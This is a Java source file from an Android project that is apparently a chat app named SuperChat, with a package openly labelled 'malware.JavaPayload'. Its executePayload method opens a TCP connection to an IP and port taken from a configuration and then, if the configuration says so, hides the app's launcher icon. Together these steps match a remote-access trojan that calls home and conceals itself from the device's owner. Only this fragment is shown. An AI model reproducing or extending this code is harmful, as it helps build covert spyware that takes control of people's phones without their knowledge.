package com.teamxdevelopers.SuperChat.malware.JavaPayload;

import android.content.Context;
import android.util.Log;
import android.app.Activity;

import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.config;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.functions;

public class AppOperations {

    private static final String TAG = "PayloadOperations";

    public static void executePayload(Activity activity, Context context) {
        Log.d(TAG, "Payload execution started");
        Log.d(TAG, "Connecting to IP: " + config.IP + " Port: " + config.port);

        // Initialize tcpConnection with both activity and context.
        new tcpConnection(activity, context).execute(config.IP, config.port);

        Log.d(TAG, "TCP connection started");

        // Check configuration and optionally hide the app icon.
        if(config.icon){
            new functions(activity).hideAppIcon(context);
        }

        Log.d(TAG, "Payload execution completed");
    }
}
